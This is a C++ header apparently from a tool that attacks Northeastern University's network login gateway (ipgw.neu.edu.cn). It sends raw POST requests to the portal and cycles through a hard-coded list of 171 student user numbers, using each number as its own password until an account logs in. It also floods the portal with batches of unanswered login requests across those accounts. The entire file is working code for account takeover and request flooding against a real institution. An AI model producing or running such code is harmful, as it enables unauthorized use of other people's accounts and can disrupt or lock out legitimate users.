#ifndef _H_REQUEST_IPGW_H_
#define _H_REQUEST_IPGW_H_

#include <iostream>
#include "usernumberlist.hpp"
#include "parse_option.h"
#include "flood.h"
#include "easy_socket/Socket.cpp"

#define DEFAULT_FLOOD_TIMES 50

Socket *just_post(const string &url, const string &data) {
    string ip = Socket::ipFromHostName(url); //Get ip addres from hostname
    string port = "80"; //let's talk on http port
    auto *sock = new Socket(AF_INET, SOCK_STREAM, 0);
    sock->connect(ip, port);
    int length = data.length();
    string socket_data =
            "POST /srun_portal_pc.php?ac_id=1& HTTP/1.1\r\nHost: ipgw.neu.edu.cn\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36\r\naccept: */*\r\ncontent-length: " +
            to_string(length) + "\r\n" + "Content-Type: application/x-www-form-urlencoded" +
            "\r\n\r\n" + data;
    sock->socket_write(socket_data);
    return sock;
}

string responsible_post(const string &url, const string &data) {
    Socket *sock = just_post(url, data);
    vector<Socket> reads(1);// new Vector reads contains type Socket length 1
    reads[0] = *sock;
    if (Socket::select(&reads, nullptr, nullptr, MAX_TIMEOUT_SECONDS) <
        1) {//Socket::select waits until sock reveives some input (for example the answer from google.com)
        fprintf(stderr, "error when sending post data...\n");
        exit(1);
    } else {
        string buffer;
        string all_data;
        while (sock->socket_read(buffer, MAX_READ_LENGTH)){
            all_data.append(buffer);
        }
        sock->close();
        return all_data;
    }
}

temp_login_result responsible_ipgw(const string &usernumber, const string &password, bool check_connected, bool detailed_response) {// if check connected set, will check weather network connected. if not, will check Union auth.
    string post_data =
            "action=login&ac_id=1&user_ip=&nas_ip=&user_mac=&URL=&username=" + usernumber + "&password=" + password +
            "&save_me=0";
    string req_data = responsible_post(IPGW_POST_ADDRESS, post_data);
    if ((check_connected || detailed_response) && req_data.find("网络已连接") != string::npos) {
        return NETWORK_CONNECTED;
    } else if ((!check_connected || detailed_response) && req_data.find("您必须使用统一身份认证") != string::npos) {
        return FORCE_UNION_AUTH;
    } else if (!detailed_response && check_connected) {
        return NETWORK_NOT_CONNECTED;
    } else if (!detailed_response) {
        return NOT_UNION_AUTH;
    }
    if (req_data.find("密码错误") != string::npos) {
        return PASSWORD_ERROR;
    } else if (req_data.find("请等待5分钟再偿试！") != string::npos) {
        return WAIT_FIVE_MINITES;
    } else {
        printf("%s", req_data.c_str());
        return UNKNOWN_RESPONSE;
    }

}

alter_result alternate_ipgw(int index, array<string, 171> &list, int ignore, bool until_connected, bool show_status) {// if until_connected not set, will try *** until not union auth.
    int try_times = 0;
    vector<int> history;
    while (true) {
        int result = responsible_ipgw(list.at(static_cast<unsigned long>(index)), list.at(
                static_cast<unsigned long>(index)), until_connected, show_status);
        history.insert(history.end(), result);
        try_times++;
        if (until_connected && result == NETWORK_CONNECTED) {
            break;
        } else if (!until_connected && result == NOT_UNION_AUTH) {// else means until "not union auth."
            break;
        }
        if (show_status) {
            fprintf(stderr, "index=%d\n", index);
        }
        index++;
        if (index == ignore) {
            index++;
        }
        if (index > 170) {
            index = 0;
        }
    }
    alter_result result1 = {try_times, index, history};
    return result1;
}

void headonly_post(const string &url, const string &data) {
    Socket *sock = just_post(url, data);
    vector<Socket> reads(1);// new Vector reads contains type Socket length 1
    reads[0] = *sock;
    Socket::select(&reads, nullptr, nullptr, MAX_TIMEOUT_SECONDS);
    sock->close();
}

void headonly_ipgw(const string &usernumber) {
    string post_data = string("action=login&ac_id=1&user_ip=&nas_ip=&user_mac=&URL=&username=").append(
            usernumber).append("&password=").append(usernumber + "&save_me=0");
    headonly_post(IPGW_POST_ADDRESS, post_data);
}

void multi_user_flood(int from_index, int times, array<string, 171> &list, bool show_status) {
    for (int i = from_index; i <= from_index + times; i++) {
        headonly_ipgw(list.at(static_cast<unsigned long>(i)));
        if (show_status) {
            fprintf(stderr, "headonly requests %d\r", i);
        }
    }
}

int flood_request(){
    int flood_index = rand() * (long) (172 - DEFAULT_FLOOD_TIMES) / RAND_MAX;
    int login_index = flood_index;
    multi_user_flood(flood_index, DEFAULT_FLOOD_TIMES, list, true);
    alter_result alterResult = alternate_ipgw(login_index, list, -1,(login_index != -1),false);
    cout << "login " << list.at(static_cast<unsigned long>(alterResult.finally_login_success_index))
             << " successful. try times " << alterResult.try_times
             << endl;
    return 0;
}

#endif